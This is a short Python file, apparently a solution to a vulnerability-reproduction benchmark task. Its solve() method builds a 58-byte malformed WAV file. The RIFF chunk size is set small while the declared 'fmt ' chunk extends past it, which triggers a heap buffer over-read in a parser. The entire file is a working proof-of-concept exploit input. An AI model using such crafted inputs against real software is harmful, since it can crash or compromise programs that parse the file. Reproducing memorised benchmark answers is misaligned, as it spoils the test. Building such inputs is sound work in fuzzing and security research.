import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability occurs when the RIFF chunk size is used to allocate a buffer,
        but inner chunks (like 'fmt ') define sizes that extend beyond this buffer.
        Missing bounds checks allow the parser to read past the allocated heap buffer.
        """
        # Ground truth length is 58 bytes.
        poc = bytearray(58)
        
        # Offset 0: 'RIFF' magic signature
        poc[0:4] = b'RIFF'
        
        # Offset 4: RIFF Chunk Size. 
        # We set this to 12. The parser allocates (Size + 8) = 20 bytes.
        # The buffer will contain bytes 0-19 of the file.
        poc[4:8] = struct.pack('<I', 12)
        
        # Offset 8: 'WAVE' format
        poc[8:12] = b'WAVE'
        
        # Offset 12: 'fmt ' subchunk ID
        poc[12:16] = b'fmt '
        
        # Offset 16: 'fmt ' subchunk size.
        # We set this to 16. The parser will attempt to read 16 bytes of format data
        # starting at offset 20.
        # Since the buffer was only allocated up to offset 19 (20 bytes total),
        # accessing offset 20 triggers a Heap Buffer Overflow (OOB Read).
        poc[16:20] = struct.pack('<I', 16)
        
        # Offset 20: Start of 'fmt ' data. 
        # These bytes exist in the file but are NOT in the allocated heap buffer.
        
        # AudioFormat (PCM = 1)
        poc[20:22] = struct.pack('<H', 1)
        # NumChannels (2)
        poc[22:24] = struct.pack('<H', 2)
        # SampleRate (44100)
        poc[24:28] = struct.pack('<I', 44100)
        # ByteRate (SampleRate * BlockAlign = 176400)
        poc[28:32] = struct.pack('<I', 176400)
        # BlockAlign (NumChannels * BitsPerSample/8 = 4)
        poc[32:34] = struct.pack('<H', 4)
        # BitsPerSample (16)
        poc[34:36] = struct.pack('<H', 16)
        
        # Offset 36: 'data' subchunk ID
        poc[36:40] = b'data'
        
        # Offset 40: 'data' subchunk size
        # Remaining space: 58 - 44 = 14 bytes
        poc[40:44] = struct.pack('<I', 14)
        
        # Offset 44-57: Audio data (padding/zeros)
        
        return bytes(poc)
